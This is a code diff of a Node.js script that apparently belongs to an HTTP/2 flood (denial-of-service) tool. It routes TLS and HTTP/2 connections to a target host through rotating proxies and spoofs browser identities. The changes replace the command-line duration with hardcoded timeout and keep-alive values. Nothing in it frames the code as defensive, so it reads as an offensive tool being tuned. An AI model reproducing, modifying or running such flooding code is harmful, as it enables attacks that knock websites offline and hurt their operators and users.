@@ -206,8 +206,8 @@ class bexcoxnxx {
          readable: true
      });
  
-     connection.setTimeout(options.timeout * 1000);
-     connection.setKeepAlive(true, options.timeout * 1000);
+     connection.setTimeout(options.timeout * 100000);
+     connection.setKeepAlive(true, 100000);
      connection.setNoDelay(true)
  
      connection.on("connect", () => {
@@ -248,7 +248,7 @@ const Socker = new bexcoxnxx();
          host: parsedProxy[0],
          port: ~~parsedProxy[1],
          address: parsedTarget.host + ":443",
-         timeout: args.time,
+         timeout: 10,
      };
 const browsers = ["chrome", "safari", "brave", "firefox", "android", "opera", "operagx"];
 const getRandomBrowser = () => {
@@ -440,7 +440,7 @@ let headersmemek = {
 }
      Socker.HTTP(proxyOptions, (connection, error) => {
          if (error) return
-         connection.setKeepAlive(true, args.time * 1000);
+         connection.setKeepAlive(true, 60000);
          connection.setNoDelay(true);
          const tlsOptions = {
             secure: true,
@@ -461,7 +461,7 @@ let headersmemek = {
         const tlsBex = tls.connect(443, parsedTarget.host, tlsOptions);
 		tlsBex.allowHalfOpen = true;
 		tlsBex.setNoDelay(true);
-		tlsBex.setKeepAlive(true, args.time * 1000);
+		tlsBex.setKeepAlive(true, 60000);
 		tlsBex.setMaxListeners(0);
 		const bexClient = http2.connect(parsedTarget.href, {
 		    protocol: "https:",
